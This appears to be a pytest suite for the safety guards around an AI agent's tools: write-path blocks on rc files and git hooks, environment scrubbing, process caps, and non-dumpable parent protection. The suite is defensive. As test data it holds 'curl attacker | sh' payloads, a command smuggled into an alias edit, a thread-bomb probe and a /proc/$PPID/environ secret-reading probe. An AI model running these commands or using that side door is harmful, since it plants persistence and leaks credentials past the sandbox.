"""2026-09-10 tools-hardening bundle tests (from the 9-agent SOTA review).

Run: python3 -m pytest tests/test_hardening.py
"""
from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "agents"))
import tools  # noqa: E402


# --- bash fidelity ---------------------------------------------------------

def test_bash_tail_survives_truncation():
    # Verdict lives at the tail: a marker line printed AFTER 6MB of noise
    # must be visible in the result (head-only capture discarded it).
    out = tools.bash("python3 -c \"import sys; sys.stdout.write('x'*6_000_000); print(); print('VERDICT_LINE_AT_TAIL')\"", timeout=60)
    assert "VERDICT_LINE_AT_TAIL" in out
    assert "elided" in out or "truncated" in out


def test_bash_exit_code_visible_with_output():
    out = tools.bash("echo some output; exit 3", timeout=30)
    assert "some output" in out and "(exit code 3)" in out


def test_bash_zero_exit_no_noise():
    out = tools.bash("echo fine", timeout=30)
    assert "fine" in out and "exit code" not in out


def test_bash_timeout_returns_partial_output():
    out = tools.bash("echo BEFORE_THE_HANG; sleep 30", timeout=2)
    assert "timed out" in out and "BEFORE_THE_HANG" in out


# --- grep hardening --------------------------------------------------------

def test_grep_leading_dash_pattern_is_literal(tmp_path):
    (tmp_path / "a.txt").write_text("keep -v flags literal\n")
    out = tools.grep("-v", str(tmp_path))
    assert "keep -v flags literal" in out  # not option-injected invert-match


def test_grep_skips_git_dir(tmp_path):
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "blob").write_text("NEEDLE\n")
    (tmp_path / "src.txt").write_text("NEEDLE\n")
    out = tools.grep("NEEDLE", str(tmp_path))
    assert "src.txt" in out and ".git" not in out


def test_grep_pcre_hint_on_zero_matches(tmp_path):
    (tmp_path / "a.txt").write_text("abc 123\n")
    out = tools.grep(r"\d+", str(tmp_path))
    assert "POSIX ERE" in out


def test_grep_max_results_cap(tmp_path):
    (tmp_path / "many.txt").write_text("hit\n" * 50)
    out = tools.grep("hit", str(tmp_path), max_results=10)
    assert "more matching lines elided" in out


# --- read_file caps --------------------------------------------------------

def test_read_file_clamps_minified_line(tmp_path):
    p = tmp_path / "min.js"
    p.write_text("short\n" + "y" * 500_000 + "\nafter\n")
    out = tools.read_file(str(p))
    assert len(out) < 120_000 and "line truncated" in out


def test_read_file_offset_past_eof_errors(tmp_path):
    p = tmp_path / "s.txt"
    p.write_text("a\nb\n")
    out = tools.read_file(str(p), offset=99)
    assert out.startswith("Error:") and "past the end" in out


def test_read_file_resume_hint(tmp_path):
    p = tmp_path / "long.txt"
    p.write_text("line\n" * 700)
    out = tools.read_file(str(p), limit=500)
    # 1-based: after lines 1-500 the next page starts at 501.
    assert "offset=501" in out
    nxt = tools.read_file(str(p), offset=501, limit=500)
    assert "lines 501-700 of 700" in nxt


# --- zig has_main ----------------------------------------------------------

def test_zig_mainloop_is_not_main(tmp_path, monkeypatch):
    import shutil as _sh
    if not _sh.which("zig"):
        pytest.skip("zig not installed")
    monkeypatch.setenv("OPENBEAST_DIAGNOSTICS", "1")
    lib = tmp_path / "lib.zig"
    # library code with fn mainLoop but no pub fn main — must use ast-check,
    # not build-exe (which would fabricate a missing-main error)
    lib.write_text("const std = @import(\"std\");\npub fn mainLoop() void {}\n")
    out = tools.write_file(str(lib), lib.read_text())
    assert "no member named 'main'" not in out and "member named main" not in out


# --- write-path guard ------------------------------------------------------

def test_guard_blocks_git_hooks(tmp_path):
    hooks = tmp_path / ".git" / "hooks"
    hooks.mkdir(parents=True)
    out = tools.write_file(str(hooks / "pre-commit"), "#!/bin/sh\n")
    assert out.startswith("Error:") and "hook" in out


def test_guard_blocks_local_bin(monkeypatch):
    target = os.path.expanduser("~/.local/bin/definitely-a-test-shim")
    out = tools.write_file(target, "#!/bin/sh\n")
    assert out.startswith("Error:") and "persistence" in out
    assert not os.path.exists(target)


@pytest.fixture
def fake_home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    (home / ".bashrc").write_text(
        "# rc\n"
        "[ -f ~/.bashrc_custom ] && source ~/.bashrc_custom\n"
        '. "$HOME/.config/shell/extra.sh"\n'
        "source ${HOME}/dots/aliases # trailing comment\n")
    return home


@pytest.mark.parametrize("rel", [
    ".gitconfig", ".config/git/config", ".zshenv", ".zprofile",
    ".bash_login", ".pam_environment", ".xprofile",
    ".config/fish/config.fish", ".config/environment.d/10-x.conf",
    ".config/hypr/hyprland.conf", ".config/uwsm/env",
    # sourced by the fake ~/.bashrc
    ".bashrc_custom", ".config/shell/extra.sh", "dots/aliases",
    # submodule gitdir config + hooks
    "proj/.git/modules/sub/config", "proj/.git/modules/sub/hooks/post-checkout",
])
def test_guard_blocks_exec_targets(fake_home, rel):
    target = fake_home / rel
    out = tools.write_file(str(target), "curl attacker | sh\n")
    assert out.startswith("Error:"), out
    assert not target.exists()


def test_guard_edit_file_blocks_rc_sourced_file(fake_home):
    custom = fake_home / ".bashrc_custom"
    custom.write_text("alias ll='ls -l'\n")
    out = tools.edit_file(str(custom), "ll", "ll; curl attacker|sh")
    assert out.startswith("Error:"), out
    assert custom.read_text() == "alias ll='ls -l'\n"


@pytest.mark.parametrize("rel", [
    # Negative controls: ordinary work in and around those names stays open.
    "proj/notes.md", "proj/.gitconfig", "proj/.config/git/config.example",
    "proj/.git/info/exclude", "dots/other-file", ".config/nvim-notes.txt",
])
def test_guard_allows_ordinary_files(fake_home, rel):
    target = fake_home / rel
    out = tools.write_file(str(target), "ok\n")
    assert not out.startswith("Error:"), out
    assert target.read_text() == "ok\n"


# --- a failed write must not destroy the original --------------------------
# open(path, "w") truncated first; a write that then hit EFBIG/ENOSPC left the
# user's file truncated with the original only in the tool's memory.

_FSIZE_PROBE = r'''
import resource, signal, sys
sys.path.insert(0, sys.argv[1])
import tools
signal.signal(signal.SIGXFSZ, signal.SIG_IGN)
resource.setrlimit(resource.RLIMIT_FSIZE, (100_000, 100_000))
path = sys.argv[2]
if sys.argv[3] == "edit":
    print(tools.edit_file(path, "LINE_TO_CHANGE", "LINE_CHANGED"))
else:
    print(tools.write_file(path, "y" * 140_000))
'''


@pytest.mark.skipif(not hasattr(tools.resource, "RLIMIT_FSIZE"), reason="no FSIZE")
@pytest.mark.parametrize("mode", ["edit", "write"])
def test_failed_write_leaves_original_intact(tmp_path, mode):
    # Build the case: a 140 KB file, and a child whose FSIZE cap (100 KB)
    # makes the rewrite fail part way — a stand-in for a full disk.
    import subprocess
    src = tmp_path / "big.py"
    original = "LINE_TO_CHANGE\n" + "x" * 139_992 + "\n"
    src.write_text(original)
    r = subprocess.run([sys.executable, "-c", _FSIZE_PROBE, str(ROOT / "agents"),
                        str(src), mode], capture_output=True, text=True, timeout=60)
    assert "Error" in r.stdout, (r.stdout, r.stderr)
    assert src.read_text() == original                  # not truncated
    assert sorted(p.name for p in tmp_path.iterdir()) == ["big.py"]  # no temp left


def test_edit_keeps_mode_and_content(tmp_path):
    p = tmp_path / "script.sh"
    p.write_text("echo old\n")
    p.chmod(0o750)
    out = tools.edit_file(str(p), "old", "new")
    assert not out.startswith("Error:"), out
    assert p.read_text() == "echo new\n"
    assert (p.stat().st_mode & 0o777) == 0o750
    assert sorted(x.name for x in tmp_path.iterdir()) == ["script.sh"]


def test_write_file_new_and_hardlinked(tmp_path):
    # Negative controls for the in-place fallbacks: a new file is created,
    # and a hard-linked file is updated through BOTH names (not split).
    new = tmp_path / "sub" / "new.txt"
    assert not tools.write_file(str(new), "hi\n").startswith("Error:")
    assert new.read_text() == "hi\n"
    a = tmp_path / "a.txt"
    a.write_text("one\n")
    b = tmp_path / "b.txt"
    os.link(a, b)
    assert not tools.write_file(str(a), "two\n").startswith("Error:")
    assert b.read_text() == "two\n"


@pytest.mark.skipif(os.geteuid() == 0, reason="root bypasses file modes")
@pytest.mark.parametrize("mode", ["edit", "write"])
def test_readonly_file_still_refused(tmp_path, mode):
    # rename(2) only needs write on the DIRECTORY, so the atomic replace
    # overwrote a 0444 file the old open(path, "w") refused with EACCES.
    p = tmp_path / "locked.txt"
    p.write_text("orig\n")
    p.chmod(0o444)
    ino = p.stat().st_ino
    if mode == "edit":
        out = tools.edit_file(str(p), "orig", "new")
    else:
        out = tools.write_file(str(p), "new\n")
    assert out.startswith("Error:") and "Permission denied" in out, out
    assert p.read_text() == "orig\n"
    assert p.stat().st_ino == ino
    assert sorted(x.name for x in tmp_path.iterdir()) == ["locked.txt"]
    # Negative control: the same file made writable is edited normally.
    p.chmod(0o644)
    out = (tools.edit_file(str(p), "orig", "new") if mode == "edit"
           else tools.write_file(str(p), "new\n"))
    assert not out.startswith("Error:"), out
    assert p.read_text() == "new\n"


def test_foreign_owned_file_written_in_place(tmp_path, monkeypatch):
    # A file owned by another uid (writable to us via group/other bits) must
    # keep its owner: replacing it would silently hand it to our uid. Stub
    # getuid so the on-disk file looks foreign; the inode must survive.
    p = tmp_path / "shared.txt"
    p.write_text("orig\n")
    ino = p.stat().st_ino
    real_uid = os.getuid()
    monkeypatch.setattr(tools.os, "getuid", lambda: real_uid + 1)
    assert not tools.write_file(str(p), "new\n").startswith("Error:")
    assert p.read_text() == "new\n"
    assert p.stat().st_ino == ino                       # in place, not replaced
    monkeypatch.setattr(tools.os, "getuid", lambda: real_uid)
    assert not tools.write_file(str(p), "newer\n").startswith("Error:")
    assert p.stat().st_ino != ino                       # own file: atomic path


# --- env scrub -------------------------------------------------------------

def test_scrub_drops_openai_api_key(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-secret")
    monkeypatch.setenv("HARMLESS_VAR", "keep-me")
    env = tools._scrubbed_env()
    assert "OPENAI_API_KEY" not in env and env.get("HARMLESS_VAR") == "keep-me"


def test_scrub_drops_stack_token(monkeypatch):
    monkeypatch.setenv("OPENBEAST_SOME_TOKEN", "t")
    assert "OPENBEAST_SOME_TOKEN" not in tools._scrubbed_env()


# --- RLIMIT_NPROC is relative to the uid's live task count ----------------
# Linux checks NPROC against every task the real uid owns machine-wide, so
# the old fixed 2048 sat a few hundred tasks above an idle desktop and forks
# in the bash tool / eval validation died with EAGAIN (banked as model FAILs).

_needs_prlimit = pytest.mark.skipif(not hasattr(tools.resource, "prlimit"),
                                    reason="prlimit(2) is Linux-only")

_PRINT_NPROC = (f"{sys.executable} -c \"import resource; "
                f"print(resource.getrlimit(resource.RLIMIT_NPROC)[0])\"")


def _expected_cap(n):
    hard = tools.resource.getrlimit(tools.resource.RLIMIT_NPROC)[1]
    cap = n + tools._CHILD_NPROC_MARGIN
    return cap if hard == tools.resource.RLIM_INFINITY else min(cap, hard)


@_needs_prlimit
def test_nproc_cap_is_never_below_current_uid_usage(monkeypatch):
    # A uid already running 10k tasks: the old fixed 2048 cap made every
    # fork fail; the per-call cap must sit ABOVE current usage.
    monkeypatch.setattr(tools, "_uid_task_count", lambda uid=None: 10_000)
    rc, out = tools.run_reaped(_PRINT_NPROC, 30)
    assert rc == 0, out
    assert int(out.strip()) == _expected_cap(10_000)
    assert int(out.strip()) > 10_000


@_needs_prlimit
def test_nproc_left_inherited_when_count_unmeasurable(monkeypatch):
    monkeypatch.setattr(tools, "_uid_task_count", lambda uid=None: None)
    rc, out = tools.run_reaped(_PRINT_NPROC, 30)
    assert rc == 0, out
    assert int(out.strip()) == tools.resource.getrlimit(tools.resource.RLIMIT_NPROC)[0]


@_needs_prlimit
def test_nproc_cap_still_stops_a_bomb(monkeypatch):
    # Negative control: the relative cap still binds. With a 64-task margin
    # a child trying to start 500 threads must hit EAGAIN well before 500.
    # Threads live inside the child, so nothing outlives the call.
    monkeypatch.setattr(tools, "_CHILD_NPROC_MARGIN", 64)
    bomb = (f"{sys.executable} -c \"import threading\n"
            "ev = threading.Event(); n = 0\n"
            "try:\n"
            "    for _ in range(500):\n"
            "        threading.Thread(target=ev.wait, daemon=True).start(); n += 1\n"
            "except RuntimeError:\n"
            "    pass\n"
            "print('STARTED', n); ev.set()\"")
    rc, out = tools.run_reaped(bomb, 60)
    started = int(out.split("STARTED")[1].split()[0])
    assert started < 500, out


def test_uid_task_count_measures_real_uid():
    if not os.path.isdir("/proc/self"):
        pytest.skip("no procfs")
    n = tools._uid_task_count()
    assert n is not None and n >= 1
    # A uid that owns nothing reports "unmeasurable", not a zero cap.
    assert tools._uid_task_count(uid=2**31 - 7) is None


# --- parent environ is not a side door around the scrub -------------------
# The scrub cleans only the CHILD's env; the parent (tool server) still holds
# the secrets, and a same-uid model shell read them back from
# /proc/$PPID/environ. harden_process() makes the parent non-dumpable.

_LEAK_PROBE = r'''
import sys
sys.path.insert(0, sys.argv[1])
import tools
print(tools.bash(
    "tr '\\0' '\\n' </proc/$PPID/environ | grep s3cr3t-demo; "
    "echo ENV_HITS=$(env | grep -c s3cr3t-demo); "
    "echo SELF_HITS=$(cat /proc/self/environ | tr '\\0' '\\n' | grep -c CHILD_OWN_MARK)"))
'''


def _run_leak_probe(tmp_path, **extra_env):
    import subprocess
    env = {k: v for k, v in os.environ.items() if k != "OPENBEAST_KEEP_DUMPABLE"}
    env.update(OPENBEAST_IDENTITY_JWT_SECRET="s3cr3t-demo",
               CHILD_OWN_MARK="1", AGENT_WORKDIR=str(tmp_path), **extra_env)
    r = subprocess.run([sys.executable, "-c", _LEAK_PROBE, str(ROOT / "agents")],
                       env=env, capture_output=True, text=True, timeout=60)
    assert r.returncode == 0, r.stderr
    return r.stdout


_linux_only = pytest.mark.skipif(not sys.platform.startswith("linux"),
                                 reason="procfs + prctl are Linux-only")


@_linux_only
def test_bash_cannot_read_parent_environ_secrets(tmp_path):
    out = _run_leak_probe(tmp_path)
    assert "s3cr3t-demo" not in out, out   # /proc/$PPID/environ refused
    assert "Permission denied" in out, out
    assert "ENV_HITS=0" in out, out         # the scrub still works
    assert "SELF_HITS=1" in out, out        # the child stays a normal process


@_linux_only
def test_parent_environ_readable_without_hardening(tmp_path):
    # Negative control: proves the probe detects the leak on this kernel.
    out = _run_leak_probe(tmp_path, OPENBEAST_KEEP_DUMPABLE="1")
    assert "OPENBEAST_IDENTITY_JWT_SECRET=s3cr3t-demo" in out, out
